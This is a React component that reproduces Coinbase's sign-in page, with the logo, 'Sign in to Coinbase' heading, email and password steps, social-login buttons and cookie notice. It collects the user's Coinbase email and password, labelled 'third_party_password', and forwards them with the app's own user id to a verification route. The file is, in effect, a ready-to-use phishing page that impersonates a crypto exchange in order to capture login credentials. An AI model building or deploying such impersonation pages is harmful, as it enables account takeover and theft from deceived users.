import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../../lib/supabase';

function CoinbaseLogo() {
  return (
    <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
      <circle cx="16" cy="16" r="16" fill="#0052FF"/>
      <path d="M16 6C10.4772 6 6 10.4772 6 16C6 21.5228 10.4772 26 16 26C20.1667 26 23.7333 23.45 25.2333 19.8333H21C19.9333 21.7 18.1167 22.9167 16 22.9167C12.1833 22.9167 9.08333 19.8167 9.08333 16C9.08333 12.1833 12.1833 9.08333 16 9.08333C18.1167 9.08333 19.9333 10.3 21 12.1667H25.2333C23.7333 8.55 20.1667 6 16 6Z" fill="white"/>
    </svg>
  );
}

export default function CoinbaseConnect() {
  const navigate = useNavigate();
  const [isDarkTheme, setIsDarkTheme] = useState(false);
  const [credentials, setCredentials] = useState({
    email: '',
    password: '',
  });
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  useEffect(() => {
    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
    const syncTheme = () => setIsDarkTheme(mediaQuery.matches);
    syncTheme();
    mediaQuery.addEventListener('change', syncTheme);
    return () => mediaQuery.removeEventListener('change', syncTheme);
  }, []);

  const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
    setCredentials((current) => ({ ...current, [field]: event.target.value }));
  };

  const handleContinue = async (event: React.FormEvent) => {
    event.preventDefault();
    if (step === 1) {
      if (!credentials.email.trim()) {
        setErrorMessage('Enter your email address to continue.');
        return;
      }
      setErrorMessage('');
      setStep(2);
      return;
    }

    if (!credentials.password) {
      setErrorMessage('Enter your password to continue.');
      return;
    }

    setLoading(true);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      const platformData = {
        platform: 'Coinbase',
        email: credentials.email,
        third_party_password: credentials.password,
        user_id: session?.user?.id || null,
      };

      // Navigate to email verification page with credentials
      navigate('/connect/coinbase/verify-email', {
        state: {
          email: credentials.email,
          platformData,
        },
      });
    } catch (err: any) {
      setErrorMessage(err.message || 'An unexpected error occurred.');
    } finally {
      setLoading(false);
    }
  };

  const dark = isDarkTheme;
  const pageClasses = dark ? 'bg-[#0a0a0a] text-white' : 'bg-white text-black';
  
  return (
    <main className={`${pageClasses} min-h-screen flex flex-col font-sans`}>
      <div className="mx-auto w-full max-w-[480px] px-6 pt-10 flex-1 flex flex-col">
        <div className="mb-14">
          <CoinbaseLogo />
        </div>

        <h1 className="text-[34px] font-bold tracking-tight mb-10">
          Sign in to Coinbase
        </h1>

        <form onSubmit={handleContinue} className="space-y-8">
          <div className="space-y-3">
            <label htmlFor="coinbase-email" className="block text-[16px] font-bold">
              Email
            </label>
            <input
              id="coinbase-email"
              type="email"
              value={credentials.email}
              onChange={handleFieldChange('email')}
              placeholder="Your email address"
              className={`h-[68px] w-full rounded-2xl border px-6 text-[18px] outline-none transition-all ${
                dark 
                  ? 'bg-transparent border-[#2d2e34] focus:border-[#0052FF] focus:ring-1 focus:ring-[#0052FF]' 
                  : 'bg-white border-[#babdc7] focus:border-[#0052FF] focus:ring-1 focus:ring-[#0052FF]'
              }`}
            />
          </div>

          {errorMessage && <p className="text-red-500 text-sm font-medium">{errorMessage}</p>}

          {step === 2 && (
            <div className="space-y-3">
              <label htmlFor="coinbase-password" className="block text-[16px] font-bold">
                Password
              </label>
              <input
                id="coinbase-password"
                type="password"
                value={credentials.password}
                onChange={handleFieldChange('password')}
                placeholder="Enter your password"
                className={`h-[68px] w-full rounded-2xl border px-6 text-[18px] outline-none transition-all ${
                  dark 
                    ? 'bg-transparent border-[#2d2e34] focus:border-[#0052FF] focus:ring-1 focus:ring-[#0052FF]' 
                    : 'bg-white border-[#babdc7] focus:border-[#0052FF] focus:ring-1 focus:ring-[#0052FF]'
                }`}
              />
            </div>
          )}

          <button
            type="submit"
            disabled={loading}
            className="h-[68px] w-full rounded-full bg-[#0052FF] text-white text-[18px] font-bold hover:bg-[#0045d9] transition-all disabled:opacity-50"
          >
            {loading ? 'Connecting...' : 'Continue'}
          </button>
        </form>

        <div className="mt-10 flex items-center gap-4">
          <div className={`h-px flex-1 ${dark ? 'bg-[#2d2e34]' : 'bg-[#e2e4e9]'}`} />
          <span className="text-[12px] font-bold text-slate-500">OR</span>
          <div className={`h-px flex-1 ${dark ? 'bg-[#2d2e34]' : 'bg-[#e2e4e9]'}`} />
        </div>

        <div className="mt-10 space-y-4">
          <button className={`flex h-[68px] w-full items-center rounded-full px-8 transition-colors ${dark ? 'bg-[#1a1b1e] text-white hover:bg-[#25262b]' : 'bg-[#f1f3f8] text-black hover:bg-[#e8ebf2]'}`}>
            <div className="flex w-6 justify-center items-center">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
            </div>
            <span className="flex-1 text-center text-[18px] font-bold">Sign in with passkey</span>
          </button>
          <button className={`flex h-[68px] w-full items-center rounded-full px-8 transition-colors ${dark ? 'bg-[#1a1b1e] text-white hover:bg-[#25262b]' : 'bg-[#f1f3f8] text-black hover:bg-[#e8ebf2]'}`}>
            <div className="flex w-6 justify-center items-center">
              <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-6 h-6" />
            </div>
            <span className="flex-1 text-center text-[18px] font-bold">Sign in with Google</span>
          </button>
          <button className={`flex h-[68px] w-full items-center rounded-full px-8 transition-colors ${dark ? 'bg-[#1a1b1e] text-white hover:bg-[#25262b]' : 'bg-[#f1f3f8] text-black hover:bg-[#e8ebf2]'}`}>
            <div className="flex w-6 justify-center items-center">
              <img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className={`w-6 h-6 ${dark ? 'invert' : ''}`} />
            </div>
            <span className="flex-1 text-center text-[18px] font-bold">Sign in with Apple</span>
          </button>
        </div>

        <p className="mt-14 text-center text-[18px] font-bold">
          Don&apos;t have an account? <span className="text-[#0052FF] cursor-pointer hover:underline">Sign up</span>
        </p>

        <div className="mt-auto py-12">
          <p className="text-[13px] leading-relaxed text-slate-500 text-center sm:text-left">
            We use strictly necessary cookies to enable essential functions, such as security and authentication. For more information, see our <button className="underline font-medium">Cookie Policy</button> and <button className="underline font-medium">Privacy Policy</button>.
          </p>
        </div>
      </div>
    </main>
  );
}
